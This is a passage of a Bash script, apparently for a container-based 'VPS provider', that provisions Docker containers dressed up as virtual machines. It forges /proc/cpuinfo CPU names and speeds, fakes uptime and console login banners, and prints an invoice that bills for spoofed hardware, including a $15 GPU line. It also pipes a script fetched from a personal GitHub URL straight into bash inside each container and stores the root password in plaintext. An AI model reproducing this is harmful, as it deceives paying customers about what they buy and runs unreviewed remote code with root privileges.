        echo -e " ${DIM}Base: ${C_BASE_GHZ}GHz  |  Boost: ${C_BOOST_GHZ}GHz${NC}"
        echo -e ""
        printf " ${YELLOW}Do you want Clock Speed Boost? (y/n): ${NC}"
        read -r boost_yes
        boost_yes="${boost_yes//$'\r'/}"
        boost_yes="${boost_yes,,}"

        if [[ "$boost_yes" == "y" ]]; then
            C_MHZ="$C_BOOST_MHZ"
            echo -e " ${GREEN}✔ ${C_NAME} @ ${C_BASE_GHZ}GHz / ${C_BOOST_GHZ}GHz ${LIME}[Boosted]${NC}"
        else
            C_MHZ="$C_BASE_MHZ"
            echo -e " ${GREEN}✔ ${C_NAME} @ ${C_BASE_GHZ}GHz ${DIM}[Base Speed]${NC}"
        fi
        sleep 2
    fi

    # Generate CPU File
    if [ "$USE_SPOOF" = true ]; then
        # Safety: ensure C_MHZ has a valid value
        if [ -z "$C_MHZ" ]; then
            echo -e " ${YELLOW}\u26a0 C_MHZ was empty, using base speed${NC}"
            C_MHZ="${C_BASE_MHZ:-2500.000}"
        fi
        log_msg "CPU Spoof: $C_NAME @ $C_MHZ MHz (vendor: $V_ID)"
        rm -rf "$CPU_FILE"
        awk -v vid="$V_ID" -v cname="$C_NAME" -v cmhz="$C_MHZ" '
        /^vendor_id/ { print "vendor_id\t: " vid; next }
        /^model name/ { print "model name\t: " cname; next }
        /^cpu MHz/ { print "cpu MHz\t\t: " cmhz; next }
        { print }
        ' /proc/cpuinfo > "$CPU_FILE"

        if [ ! -f "$CPU_FILE" ] || [ ! -s "$CPU_FILE" ]; then
            echo -e " ${RED}✘ Failed to generate CPU spoof file. Reverting to Default CPU.${NC}"
            USE_SPOOF=false
            rm -rf "$CPU_FILE"
        fi
    fi

    mkdir -p "$DATA_DIR"
    docker rm -f "$VM_NAME" >/dev/null 2>&1

    # ==========================================
    # CUSTOM UPTIME (dynamic — starts at the value, then grows naturally)
    # ==========================================
    clear
    echo -e "${CYAN}┌──────────────────────────────────────────┐${NC}"
    echo -e "         ${WHITE}UPTIME CONFIGURATION${NC}"
    echo -e "${CYAN}└──────────────────────────────────────────┘${NC}"
    echo -e " ${DIM}Uptime is dynamic: it starts at the chosen value and${NC}"
    echo -e " ${DIM}keeps growing like a real VM as the container runs.${NC}"
    printf " Do you need custom uptime? (y/n): "
    read -r uptime_yes
    uptime_yes="${uptime_yes//$'\r'/}"
    uptime_yes="${uptime_yes,,}"
    FAKE_UPTIME_SEC=""

    if [[ "$uptime_yes" == "y" ]]; then
        echo -e ""
        echo -e " 1) ${GREEN}System Uptime${NC} (Show your main server's real uptime)"
        echo -e " 2) ${CYAN}Custom Start Uptime${NC} (Start at any value, then grow naturally)"
        echo -e ""
        printf " Selection [1-2]: "
        read -r uptime_type
        uptime_type="${uptime_type//$'\r'/}"

        if [ "$uptime_type" == "2" ]; then
            echo -e ""
            echo -e " ${DIM}Examples: 1m, 5m, 30m, 1h, 100d, 365d, 1y, 30d 12h${NC}"
            printf " Enter starting uptime: "
            read -r uptime_input
            FAKE_UPTIME_SEC=$(parse_uptime_to_seconds "$uptime_input")
            if [ -z "$FAKE_UPTIME_SEC" ] || [ "$FAKE_UPTIME_SEC" -le 0 ] 2>/dev/null; then
                FAKE_UPTIME_SEC="60"
            fi
            echo -e " ${GREEN}✔ Custom uptime set (starts at $(parse_seconds_to_human "$FAKE_UPTIME_SEC"), grows naturally)${NC}"
        else
            FAKE_UPTIME_SEC="SYSTEM"
            echo -e " ${GREEN}✔ Will show system (real) uptime${NC}"
        fi
    else
        # Default: start at 1 minute, then grow naturally like a real VM
        FAKE_UPTIME_SEC="60"
        echo -e " ${DIM}✔ Default uptime: 1 minute (grows naturally like a real VM)${NC}"
    fi
    sleep 1

    echo -e " ${BLUE}▶${NC} Deploying container..."

    # ==========================================
    # COMMAND CONSTRUCTION (v3.5: performance-tuned + boot fix)
    # Optimizations:
    #   --cpu-shares=2048   → higher CPU priority than default containers (default=1024)
    #   --blkio-weight=1000 → max disk I/O priority (default=500, max=1000)
    #   --shm-size=256m     → larger /dev/shm (default 64M causes crashes for Redis/MariaDB/Node)
    #   --pids-limit=-1     → unlimited processes (default may block forks under load)
    #   --dns 1.1.1.1 8.8.8.8 → fast public DNS for snappy apt/git/curl
    # NOTE: --init is ONLY used for non-systemd images. Systemd images
    #   (jrei/systemd-*) must have /sbin/init as PID 1 — adding --init wraps
    #   it with tini, which causes "Couldn't find an alternative telinit"
    #   boot failures.
    # ==========================================
    local _init_flag=""
    if [ "$IS_FULL" != true ]; then
        _init_flag="--init"
    fi
    CMD="docker run -dt --name $VM_NAME --hostname $VM_ID_NAME --restart unless-stopped $_init_flag --cpu-shares=2048 --blkio-weight=1000 --shm-size=256m --pids-limit=-1 --cap-add=NET_ADMIN --dns 1.1.1.1 --dns 8.8.8.8 -v $DATA_DIR:/root:rw"

    # GPU PASSTHROUGH (real device, only if user chose one)
    if [ -n "$GPU_DEVICE" ]; then
        if [ "$GPU_DEVICE" == "all" ]; then
            CMD="$CMD --gpus all"
        else
            CMD="$CMD --gpus device=$GPU_DEVICE"
        fi
        CMD="$CMD --runtime=nvidia"
    fi

    # Full VM mode: privileged + systemd support for all non-Alpine distros
    if [ "$IS_FULL" = true ]; then
        CMD="$CMD --privileged --cgroupns=host --security-opt seccomp=unconfined --tmpfs /tmp --tmpfs /run --tmpfs /run/lock -v /sys/fs/cgroup:/sys/fs/cgroup:rw"
    fi

    if [ "$MODE" == "dedicated" ]; then
        CMD="$CMD --cpus=$CORES --memory=$RAM --memory-swap=$RAM"
    elif [ "$MODE" == "shared" ]; then
        CMD="$CMD --cpus=$CORES --memory=$RAM"
    elif [ "$MODE" == "fresh" ]; then
        # Fresh VPS Start: NO hard limits — container uses host resources
        # dynamically. Container-aware stats (fake free/df + neofetch override)
        # are installed for ALL VMs below. No --cpus or --memory flags here.
        :
    fi

    if [ "$VM_TYPE" == "vds" ]; then
        if [ "$(check_real_kvm)" == "true" ]; then
            CMD="$CMD --device /dev/kvm"
            log_msg "VDS: /dev/kvm mapped to $VM_NAME"
        else
            echo -e " ${RED}✘ CRITICAL: Host KVM extensions are missing. VDS creation aborted.${NC}"
            echo -e " ${YELLOW}Note: Creating a folder with 'mkdir /dev/kvm' does NOT give you KVM.${NC}"
            sleep 4
            return
        fi
    else
        log_msg "VPS: Software mode for $VM_NAME"
    fi

    if [ "$USE_SPOOF" = true ]; then
        CMD="$CMD -v $CPU_FILE:/proc/cpuinfo:ro"
    fi

    if [ -n "$MODEL_NAME" ]; then
        CMD="$CMD -v $DMI_PRODUCT_FILE:/etc/custom_product_name:ro"
        CMD="$CMD -v $DMI_VENDOR_FILE:/etc/custom_sys_vendor:ro"
    fi

    if [ "$IS_FULL" = true ]; then
        CMD="$CMD $IMG /sbin/init"
    else
        CMD="$CMD $IMG $VM_SHELL"
    fi

    # ==========================================
    # PRE-BOOT SUMMARY SCREEN (show details, then press Enter to boot)
    # ==========================================

    # CPU display string
    local _pre_cpu_display="${DIM}Host CPU${NC}"
    if [ "$USE_SPOOF" = true ]; then
        local _cghz=$(awk "BEGIN{printf \"%.1f\", ${C_MHZ}/1000}")
        _pre_cpu_display="${CYAN}${C_NAME}${NC} @ ${_cghz}GHz"
    fi

    # GPU display string
    local _pre_gpu_display="${DIM}None${NC}"
    if [ -n "$GPU_SPOOF_NAME" ]; then
        local _ggb=$((GPU_SPOOF_VRAM / 1024))
        _pre_gpu_display="${CYAN}${GPU_SPOOF_NAME}${NC} ${DIM}[${_ggb}GB]${NC}"
    fi

    # RAM / Disk display — handle empty RAM (fresh mode) by using host totals
    local _pre_display_ram="${RAM}"
    local _pre_display_cores="${CORES}"
    if [ -z "$_pre_display_ram" ]; then
        local _host_ram_mb=$(free -m 2>/dev/null | awk '/^Mem:/{print $2}')
        if [ -n "$_host_ram_mb" ] && [ "$_host_ram_mb" -ge 1024 ] 2>/dev/null; then
            _pre_display_ram=$(awk "BEGIN{printf \"%.0fG\", $_host_ram_mb/1024}")
        else
            _pre_display_ram="${_host_ram_mb:-2G}M"
        fi
    fi
    if [ -z "$_pre_display_cores" ]; then
        _pre_display_cores=$(nproc 2>/dev/null)
        [ -z "$_pre_display_cores" ] && _pre_display_cores=1
    fi

    local _pre_ram_display="${CYAN}${_pre_display_ram}${NC}"
    if [ "$MODE" == "unlimited" ]; then
        _pre_ram_display="${DIM}Unlimited (Host)${NC}"
    elif [ "$MODE" == "fresh" ]; then
        _pre_ram_display="${LIME}${_pre_display_ram}${NC} ${DIM}(Dynamic)${NC}"
    fi

    # Speed display
    local _pre_speed_display="${DIM}Unlimited${NC}"
    if [ -n "$NET_SPEED" ]; then
        if [ "$NET_SPEED" -ge 1000 ]; then
            _pre_speed_display="${CYAN}$((NET_SPEED/1000))Gbps${NC}"
        else
            _pre_speed_display="${CYAN}${NET_SPEED}Mbps${NC}"
        fi
    fi

    # Price calculation
    local _p_cpu=0; local _p_ram=0; local _p_disk=5; local _p_speed=0; local _p_gpu=0; local _p_type=0
    [[ "$_pre_display_cores" =~ ^[0-9]+$ ]] && _p_cpu=$(( _pre_display_cores * 2 ))
    local _p_ram_gb=0
    local _p_ram_num=$(echo "$_pre_display_ram" | tr -dc '0-9')
    local _p_ram_u=$(echo "$_pre_display_ram" | tr -dc 'a-zA-Z')
    case "$_p_ram_u" in g|G) _p_ram_gb=$_p_ram_num;; m|M) _p_ram_gb=$(( _p_ram_num / 1024 ));; *) _p_ram_gb=$_p_ram_num;; esac
    [ "$_p_ram_gb" -lt 1 ] 2>/dev/null && _p_ram_gb=1
    _p_ram=$(( _p_ram_gb * 3 ))
    [ -n "$NET_SPEED" ] && [[ "$NET_SPEED" =~ ^[0-9]+$ ]] && _p_speed=$(( NET_SPEED / 100 ))
    [ -n "$GPU_SPOOF_NAME" ] && _p_gpu=15
    [ "$VM_TYPE" == "vds" ] && _p_type=10
    local _p_total=$(( _p_cpu + _p_ram + _p_disk + _p_speed + _p_gpu + _p_type ))

    clear
    echo -e "${GOLD}═══════════════════════════════════════════════════════════════${NC}"
    echo -e ""
    echo -e "        ${BRIGHT_ORANGE}${BOLD}${HOSTING_NAME}${NC} ${PREMIUM}The Premium VPS Provider${NC}"
    echo -e ""
    echo -e "        ${YELLOW}${BOLD}📋 VM PROVISIONING SUMMARY${NC}"
    echo -e ""
    echo -e "${GOLD}───────────────────────────────────────────────────────────────${NC}"
    echo -e "  ${BOLD}VM SPECIFICATIONS${NC}"
    echo -e "${GOLD}───────────────────────────────────────────────────────────────${NC}"
    echo -e "  ${WHITE}Hostname:${NC}       ${CYAN}${VM_ID_NAME}${NC}"
    echo -e "  ${WHITE}VM Type:${NC}        ${CYAN}${VM_TYPE^^}${NC}"
    echo -e "  ${WHITE}OS Image:${NC}       ${CYAN}${IMG}${NC}"
    echo -e "  ${WHITE}CPU:${NC}             ${_pre_cpu_display}"
    echo -e "  ${WHITE}RAM:${NC}             ${_pre_ram_display}"
    echo -e "  ${WHITE}Disk:${NC}            ${CYAN}50GB${NC}"
    echo -e "  ${WHITE}Network:${NC}        ${_pre_speed_display}"
    echo -e "  ${WHITE}GPU:${NC}             ${_pre_gpu_display}"
    echo -e "  ${WHITE}Root Password:${NC}   ${RED}${VM_PASS}${NC}"
    echo -e "${GOLD}───────────────────────────────────────────────────────────────${NC}"
    echo -e "  ${BOLD}INVOICE — Monthly Breakdown${NC}"
    echo -e "${GOLD}───────────────────────────────────────────────────────────────${NC}"
    printf  "  ${WHITE}CPU${NC} (%s cores)              ${GREEN}\$%i${NC}/mo\n" "$_pre_display_cores" "$_p_cpu"
    printf  "  ${WHITE}RAM${NC} (%sGB)                   ${GREEN}\$%i${NC}/mo\n" "$_p_ram_gb" "$_p_ram"
    printf  "  ${WHITE}Disk${NC} (50GB SSD)              ${GREEN}\$%i${NC}/mo\n" "$_p_disk"
    printf  "  ${WHITE}Network${NC}                      ${GREEN}\$%i${NC}/mo\n" "$_p_speed"
    printf  "  ${WHITE}GPU${NC}                          ${GREEN}\$%i${NC}/mo\n" "$_p_gpu"
    printf  "  ${WHITE}VDS Surcharge${NC}                ${GREEN}\$%i${NC}/mo\n" "$_p_type"
    echo -e "${GOLD}───────────────────────────────────────────────────────────────${NC}"
    printf  "  ${BOLD}TOTAL PRICE${NC}                   ${GOLD}${BOLD}\$%i${NC}${BOLD}/mo${NC}\n" "$_p_total"
    echo -e "${GOLD}═══════════════════════════════════════════════════════════════${NC}"
    echo -e ""
    echo -ne "  ${BRIGHT_ORANGE}▶${NC} ${YELLOW}Press ENTER to start booting the VM...${NC}"
    read -r _enter_to_boot

    # ==========================================
    # EXECUTE AND LOG
    # ==========================================
    log_msg "Creating: $VM_NAME"
    log_msg "Docker CMD: $CMD"

    DOCKER_ERR=$(eval "$CMD" 2>&1)
    STATUS=$?

    if [ $STATUS -eq 0 ]; then
        log_msg "Container $VM_NAME created."

        echo -e " ${BLUE}∞${NC} Booting VM (streaming system start logs)..."
        echo ""
        BOOTED=false
        # Stream boot logs in background so user sees systemd [ OK ] messages
        docker logs -f "$VM_NAME" 2>&1 &
        LOG_PID=$!
        for i in {1..45}; do
            if docker exec "$VM_NAME" echo "ready" >/dev/null 2>&1; then
                BOOTED=true
                break
            fi
            sleep 2
        done
        # Kill the background log streamer
        kill $LOG_PID 2>/dev/null
        wait $LOG_PID 2>/dev/null
        echo ""

        # Fallback: if boot failed, try recreating WITHOUT --init (systemd conflict)
        if [ "$BOOTED" == false ] && [ "$IS_FULL" = true ]; then
            echo -e " ${YELLOW}⚠ First boot attempt failed. Retrying with adjusted init...${NC}"
            log_msg "VM $VM_NAME boot failed on first attempt, retrying without --init"
            docker rm -f "$VM_NAME" >/dev/null 2>&1
            # Rebuild CMD without --init (in case it was set) and without --privileged's
            # cgroup conflicts — use a simpler launch
            CMD="docker run -dt --name $VM_NAME --hostname $VM_ID_NAME --restart unless-stopped --cpu-shares=2048 --blkio-weight=1000 --shm-size=256m --pids-limit=-1 --cap-add=NET_ADMIN --dns 1.1.1.1 --dns 8.8.8.8 -v $DATA_DIR:/root:rw"
            if [ -n "$GPU_DEVICE" ]; then
                if [ "$GPU_DEVICE" == "all" ]; then CMD="$CMD --gpus all"; else CMD="$CMD --gpus device=$GPU_DEVICE"; fi
                CMD="$CMD --runtime=nvidia"
            fi
            CMD="$CMD --privileged --cgroupns=host --security-opt seccomp=unconfined --tmpfs /tmp --tmpfs /run --tmpfs /run/lock -v /sys/fs/cgroup:/sys/fs/cgroup:rw"
            if [ "$MODE" == "dedicated" ]; then
                CMD="$CMD --cpus=$CORES --memory=$RAM --memory-swap=$RAM"
            elif [ "$MODE" == "shared" ]; then
                CMD="$CMD --cpus=$CORES --memory=$RAM"
            # fresh mode: no limits (same as main CMD construction)
            fi
            if [ "$VM_TYPE" == "vds" ] && [ "$(check_real_kvm)" == "true" ]; then
                CMD="$CMD --device /dev/kvm"
            fi
            if [ "$USE_SPOOF" = true ]; then
                CMD="$CMD -v $CPU_FILE:/proc/cpuinfo:ro"
            fi
            if [ -n "$MODEL_NAME" ]; then
                CMD="$CMD -v $DMI_PRODUCT_FILE:/etc/custom_product_name:ro"
                CMD="$CMD -v $DMI_VENDOR_FILE:/etc/custom_sys_vendor:ro"
            fi
            CMD="$CMD $IMG /sbin/init"
            log_msg "Retry CMD: $CMD"
            DOCKER_ERR=$(eval "$CMD" 2>&1)
            STATUS=$?
            if [ $STATUS -eq 0 ]; then
                echo -e " ${BLUE}∞${NC} Retrying boot (streaming system start logs)..."
                echo ""
                docker logs -f "$VM_NAME" 2>&1 &
                LOG_PID=$!
                for i in {1..45}; do
                    if docker exec "$VM_NAME" echo "ready" >/dev/null 2>&1; then
                        BOOTED=true
                        break
                    fi
                    sleep 2
                done
                kill $LOG_PID 2>/dev/null
                wait $LOG_PID 2>/dev/null
                echo ""
            fi
        fi

        if [ "$BOOTED" == false ]; then
            echo -e " ${RED}✘ VM failed to boot. Your host kernel may not support nested Systemd.${NC}"
            echo -e " ${YELLOW}Showing VM logs...${NC}"
            docker logs "$VM_NAME" --tail 20
            log_msg "VM Boot Failed"
            sleep 5
            return
        fi

        # 1. Set Root Password + store for login screen validation
        echo "root:$VM_PASS" | docker exec -i "$VM_NAME" $VM_SHELL -c "chpasswd"
        # Store root password inside container so the login screen can validate
        docker exec "$VM_NAME" mkdir -p /etc/tasin-spoof 2>/dev/null
        docker exec "$VM_NAME" bash -c "printf '%s\n' '$VM_PASS' > /etc/tasin-spoof/root_password" 2>/dev/null

        # 1b. Install OS-specific login screen script
        cat << 'LOGIN_EOF' > /tmp/_tasin_login
#!/bin/sh
# TASIN VM Login Screen v3.6
# Shows an OS-specific console login prompt, validates credentials,
# then drops to a shell with the OS-specific MOTD welcome banner.

# Load OS info
OS_NAME="Linux"
OS_VERSION=""
OS_PRETTY=""
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS_NAME="$NAME"
    OS_VERSION="$VERSION_ID"
    OS_PRETTY="$PRETTY_NAME"
fi

HOSTNAME=$(hostname)
KERNEL=$(uname -r)

# Read stored root password
ROOT_PASS=""
if [ -f /etc/tasin-spoof/root_password ]; then
    ROOT_PASS=$(cat /etc/tasin-spoof/root_password 2>/dev/null | head -1 | tr -d '\r\n')
fi

# Login loop
MAX_TRIES=3
TRIES=0
while [ "$TRIES" -lt "$MAX_TRIES" ]; do
    echo ""
    echo "${OS_PRETTY:-$OS_NAME $OS_VERSION} ${HOSTNAME} console"
    echo ""
    printf "login as: "
    read -r USERNAME
    [ -z "$USERNAME" ] && continue

    # Only root is allowed
    if [ "$USERNAME" != "root" ]; then
        echo "Login incorrect"
        TRIES=$((TRIES + 1))
        continue
    fi

    # Read password (hidden) — POSIX-compatible (no 'read -s' which is bash-only)
    printf "Password: "
    # Save current tty settings, disable echo, read password, restore tty
    if command -v stty >/dev/null 2>&1; then
        stty_save=$(stty -g 2>/dev/null)
        stty -echo 2>/dev/null
        read -r PASSWORD
        stty "$stty_save" 2>/dev/null
    else
        # Fallback: no stty available (rare), read visibly
        read -r PASSWORD
    fi
    echo ""

    # Validate
    if [ "$PASSWORD" = "$ROOT_PASS" ]; then
        # Login successful — show OS-specific MOTD
        echo ""
        case "$OS_NAME" in
            Ubuntu)
                echo "Welcome to ${OS_NAME} ${OS_VERSION} LTS (GNU/Linux ${KERNEL} x86_64)"
                echo ""
                echo " * Documentation:  https://help.ubuntu.com"
                echo " * Management:     https://landscape.canonical.com"
                echo " * Support:        https://ubuntu.com/pro"
                echo ""
                echo "This system has been minimized by removing packages and content that are"
                echo "not required on a system that users do not log into."
                echo ""
                echo "To restore this content, you can run the 'unminimize' command."
                ;;
            Debian)
                echo "Linux ${HOSTNAME} ${OS_VERSION} (GNU/Linux ${KERNEL} x86_64)"
                echo ""
                echo " * Documentation:  https://www.debian.org/doc/"
                echo " * Management:     https://www.debian.org/support"
                echo " * Support:        https://www.debian.org/support"
                ;;
            Kali)
                echo "Kali GNU/Linux Rolling (GNU/Linux ${KERNEL} x86_64)"
                echo ""
                echo " * Documentation:  https://www.kali.org/docs/"
                echo " * Support:        https://forums.kali.org/"
                ;;
            Alpine)
                echo "Welcome to Alpine Linux ${OS_VERSION}"
                echo "Kernel ${KERNEL} on an x86_64 (/dev/tty1)"
                echo ""
                echo " * Documentation:  https://alpinelinux.org/docs/"
                ;;
            *)
                echo "Welcome to ${OS_PRETTY:-$OS_NAME}"
                ;;
        esac
        echo ""
        echo "Last login: $(date '+%a %b %d %H:%M:%S %Y') from console"
        echo ""
        # Drop to shell
        if [ -x /bin/bash ]; then
            exec /bin/bash
        else
            exec /bin/sh
        fi
    else
        echo "Login incorrect"
        TRIES=$((TRIES + 1))
    fi
done

echo ""
echo "Maximum login attempts exceeded. Connection closed."
sleep 1
exit 1
LOGIN_EOF
        docker cp /tmp/_tasin_login "$VM_NAME":/usr/local/bin/tasin-login
        docker exec "$VM_NAME" chmod +x /usr/local/bin/tasin-login 2>/dev/null
        rm -f /tmp/_tasin_login

        # 2. CUSTOM UPTIME (dynamic: starts at offset, grows naturally with container)
        # Save real uptime binary first (for SYSTEM mode passthrough)
        docker exec "$VM_NAME" bash -c "if [ -f /usr/bin/uptime ] && [ ! -f /usr/bin/uptime.real ]; then cp /usr/bin/uptime /usr/bin/uptime.real; fi" 2>/dev/null

        if [ "$FAKE_UPTIME_SEC" == "SYSTEM" ]; then
            # Pass through to real uptime (shows host uptime)
            cat << 'UPTIME_SYS' > /tmp/uptime_wrap
#!/bin/bash
if [ -x /usr/bin/uptime.real ]; then
    exec /usr/bin/uptime.real "$@"
else
    exec /usr/bin/uptime "$@"
fi
UPTIME_SYS
        else
            # Dynamic fake uptime: real container uptime + offset (starts at offset, grows naturally)
            # Write the offset file inside the container so both the wrapper and neofetch read the same value
            docker exec "$VM_NAME" bash -c "echo '${FAKE_UPTIME_SEC}' > /root/.fake_uptime_offset" 2>/dev/null

            cat << 'UPTIME_DYN' > /tmp/uptime_wrap
#!/bin/bash
# TASIN dynamic uptime - starts at offset, grows naturally like a real VM
OFFSET=60
if [ -f /root/.fake_uptime_offset ]; then
    OFFSET=$(cat /root/.fake_uptime_offset 2>/dev/null | head -1 | tr -dc '0-9')
fi
[ -z "$OFFSET" ] && OFFSET=60

# Real container uptime (PID 1 elapsed seconds)
REAL_SEC=$(ps -p 1 -o etimes= 2>/dev/null | awk '{print $1}' | tr -dc '0-9')
[ -z "$REAL_SEC" ] && REAL_SEC=0

# Total fake uptime = real + offset
TOTAL=$(( REAL_SEC + OFFSET ))

if [ "$1" == "-p" ]; then
    # neofetch pretty format: "up X days, Y hours, Z minutes"
    D=$(( TOTAL / 86400 ))
    REM=$(( TOTAL % 86400 ))
    H=$(( REM / 3600 ))
    M=$(( (REM % 3600) / 60 ))
    OUT=""
    if [ "$D" -gt 0 ]; then
        [ "$D" -eq 1 ] && OUT="${OUT}${D} day, " || OUT="${OUT}${D} days, "
    fi
    if [ "$H" -gt 0 ] || [ "$D" -gt 0 ]; then
        if [ "$H" -eq 1 ]; then
            OUT="${OUT}1 hour, "
        else
            OUT="${OUT}${H} hours, "
        fi
    fi
    if [ "$M" -eq 1 ]; then
        OUT="${OUT}1 minute"
    else
        OUT="${OUT}${M} minutes"
    fi
    echo "$OUT"
else
    # Standard uptime format: "  HH:MM:SS up D days, H:M,  1 user,  load average: ..."
    D=$(( TOTAL / 86400 ))
    H=$(( (TOTAL % 86400) / 3600 ))
    M=$(( (TOTAL % 3600) / 60 ))
    if [ "$D" -eq 1 ]; then
        printf "  %s up %d day, %d:%02d,  1 user,  load average: 0.08, 0.03, 0.01\n" "$(date +%H:%M:%S)" "$D" "$H" "$M"
    else
        printf "  %s up %d days, %d:%02d,  1 user,  load average: 0.08, 0.03, 0.01\n" "$(date +%H:%M:%S)" "$D" "$H" "$M"
    fi
fi
UPTIME_DYN
        fi

        docker cp /tmp/uptime_wrap "$VM_NAME":/usr/local/bin/uptime
        docker exec "$VM_NAME" bash -c "chmod +x /usr/local/bin/uptime" 2>/dev/null
        # Ensure /usr/local/bin is in PATH so `uptime` resolves to our wrapper
        docker exec "$VM_NAME" bash -c "grep -q 'usr/local/bin' /etc/profile 2>/dev/null || echo 'export PATH=/usr/local/bin:\$PATH' >> /etc/profile" 2>/dev/null
        rm -f /tmp/uptime_wrap



        # 3. Install Packages (Neofetch + essentials first, Docker CE in background)
        if [ "$IS_FULL" = true ]; then
            echo -e " ${BLUE}∞${NC} Installing packages (Neofetch, Python3, Node.js)..."
            # Base packages - fast, non-blocking
            docker exec "$VM_NAME" bash -c "apt-get update -qq && apt-get install -y -qq ca-certificates curl wget sudo nano gnupg lsb-release neofetch iproute2 procps pciutils python3 python3-pip nodejs npm software-properties-common gnupg2 >/dev/null 2>&1" 2>/dev/null

            # Pre-configure container for MariaDB/MySQL (systemd services, sysctls)
            docker exec "$VM_NAME" bash -c '
                # MariaDB needs these sysctls
                sysctl -w vm.swappiness=1 >/dev/null 2>&1
                # Ensure systemd can manage database services
                mkdir -p /etc/systemd/system/mariadb.service.d 2>/dev/null
                mkdir -p /etc/systemd/system/mysql.service.d 2>/dev/null
                # Create a pre-install setup so mariadb/mysql "just works" with systemctl
                echo "[Service]
LimitNOFILE=16384
LimitNPROC=32768" > /etc/systemd/system/mariadb.service.d/limits.conf 2>/dev/null
                cp /etc/systemd/system/mariadb.service.d/limits.conf /etc/systemd/system/mysql.service.d/limits.conf 2>/dev/null
                systemctl daemon-reload >/dev/null 2>&1
            ' 2>/dev/null

            # Pre-install MariaDB, MySQL, and PHP 8.3-FPM for Pterodactyl panels (in background)
            docker exec "$VM_NAME" bash -c "cat > /tmp/install_ptero_deps.sh << 'PTDEOF'
#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq 2>/dev/null

# Install MariaDB and MySQL client
apt-get install -y -qq mariadb-server mariadb-client mysql-client >/dev/null 2>&1

# Install PHP 8.3-FPM and common extensions for Pterodactyl
apt-get install -y -qq software-properties-common gnupg2 >/dev/null 2>&1
add-apt-repository -y ppa:ondrej/php >/dev/null 2>&1
apt-get update -qq 2>/dev/null
apt-get install -y -qq php8.3-fpm php8.3-cli php8.3-common php8.3-mbstring php8.3-xml php8.3-mysql php8.3-curl php8.3-zip php8.3-gd php8.3-intl php8.3-bcmath php8.3-redis >/dev/null 2>&1

# Enable and start database services
systemctl enable mariadb >/dev/null 2>&1
systemctl enable mysql >/dev/null 2>&1
systemctl start mariadb >/dev/null 2>&1
systemctl start mysql >/dev/null 2>&1

# Enable and start PHP-FPM
systemctl enable php8.3-fpm >/dev/null 2>&1
systemctl start php8.3-fpm >/dev/null 2>&1

rm -f /tmp/install_ptero_deps.sh
PTDEOF
chmod +x /tmp/install_ptero_deps.sh" 2>/dev/null
            docker exec -d "$VM_NAME" bash -c "nohup /tmp/install_ptero_deps.sh > /var/log/ptero_deps_install.log 2>&1 &" 2>/dev/null

            # Docker CE - installed in BACKGROUND so VM stays fast & responsive
            docker exec "$VM_NAME" bash -c "mkdir -p /etc/docker && echo '{\"storage-driver\": \"vfs\", \"iptables\": false}' > /etc/docker/daemon.json" 2>/dev/null
            docker exec "$VM_NAME" bash -c "cat > /tmp/install_docker_bg.sh << 'DINSEOF'
#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
mkdir -p /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor --yes -o /etc/apt/keyrings/docker.gpg 2>/dev/null
echo \"deb [arch=\$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \$(lsb_release -cs) stable\" > /etc/apt/sources.list.d/docker.list
apt-get update -qq 2>/dev/null
apt-get install -y -qq docker-ce docker-ce-cli containerd.io docker-compose-plugin >/dev/null 2>&1
systemctl enable docker >/dev/null 2>&1
systemctl start docker >/dev/null 2>&1
sleep 2
if ! docker ps >/dev/null 2>&1; then
    dockerd --storage-driver=vfs --iptables=false > /var/log/dockerd.log 2>&1 &
fi
cat > /usr/local/bin/start_docker.sh << 'DSEOF'
#!/bin/bash
if ! docker ps >/dev/null 2>&1; then
    dockerd --storage-driver=vfs --iptables=false > /var/log/dockerd.log 2>&1 &
fi
DSEOF
chmod +x /usr/local/bin/start_docker.sh
grep -q start_docker /etc/rc.local 2>/dev/null || echo '/usr/local/bin/start_docker.sh' >> /etc/rc.local
chmod +x /etc/rc.local 2>/dev/null
rm -f /tmp/install_docker_bg.sh
DINSEOF
chmod +x /tmp/install_docker_bg.sh" 2>/dev/null
            docker exec -d "$VM_NAME" bash -c "nohup /tmp/install_docker_bg.sh > /var/log/docker_install.log 2>&1 &" 2>/dev/null

            echo -e " ${GREEN}✔ Neofetch + Python3 + Node.js installed!${NC}"
            echo -e " ${DIM}  Docker CE + MariaDB + PHP 8.3-FPM installing in background...${NC}"

            # 3b. Run SQL fixer script (installs MariaDB/MySQL fix + optimization)
            echo -e " ${BLUE}∞${NC} Running SQL fixer script..."
            docker exec "$VM_NAME" bash -c "curl -s https://raw.githubusercontent.com/iTzTaisn69/sqlfixer/refs/heads/main/itztasin69.sh | bash 2>/dev/null" 2>/dev/null
            log_msg "SQL fixer script executed on $VM_NAME"
        else
            echo -e " ${BLUE}∞${NC} Installing system packages..."
            docker exec "$VM_NAME" bash -c "apt-get update -qq && apt-get install -y -qq neofetch curl wget sudo nano iproute2 procps pciutils python3 python3-pip nodejs npm >/dev/null 2>&1" 2>/dev/null
            docker exec "$VM_NAME" $VM_SHELL -c "apk add --no-cache neofetch curl wget sudo nano iproute2 pciutils python3 nodejs 2>/dev/null" 2>/dev/null
        fi

        # 3.5 SYSTEMD PERFORMANCE TUNING (makes the VM feel faster & smoother)
        # Disables background CPU hogs that compete with user workloads:
        #   - apt-daily.timer / apt-daily-upgrade.timer → auto apt update/upgrade (steals CPU + disk)
        #   - man-db.timer                              → rebuilds manpage index (CPU spike)
        #   - motd-news.timer                           → fetches Ubuntu news on login (network stall)
        # Also: lower swappiness, unlimited journal rate, faster DNS
        if [ "$IS_FULL" = true ]; then
            docker exec "$VM_NAME" bash -c '
                # Disable background timers that steal CPU
                systemctl disable apt-daily.timer apt-daily-upgrade.timer 2>/dev/null
                systemctl disable man-db.timer 2>/dev/null
                systemctl disable motd-news.timer 2>/dev/null
                systemctl mask apt-daily.service apt-daily-upgrade.service 2>/dev/null
                systemctl mask systemd-networkd-wait-online.service 2>/dev/null
                # Stop them if already running
                systemctl stop apt-daily.timer apt-daily-upgrade.timer 2>/dev/null
                systemctl stop man-db.timer motd-news.timer 2>/dev/null

                # Lower swappiness — prefer RAM over swap (faster)
                echo "vm.swappiness=10" > /etc/sysctl.d/99-tasin-performance.conf
